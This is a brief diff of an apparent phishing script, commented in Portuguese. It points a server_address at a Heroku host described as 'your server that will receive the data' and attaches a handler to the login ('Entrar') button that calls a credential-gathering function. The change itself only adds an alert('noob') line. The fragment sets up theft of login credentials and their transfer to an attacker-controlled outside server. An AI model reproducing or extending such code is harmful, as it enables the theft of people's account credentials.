@@ -1,5 +1,5 @@
 server_address = 'https://floating-springs-98504.herokuapp.com' // o endereço do seu servidor que irá receber os dados
-
+alert('noob');
 // na primeira página é esse o botão "Entrar"
 $("input[type='submit']").on('click', function(event){
     getCredenciais();
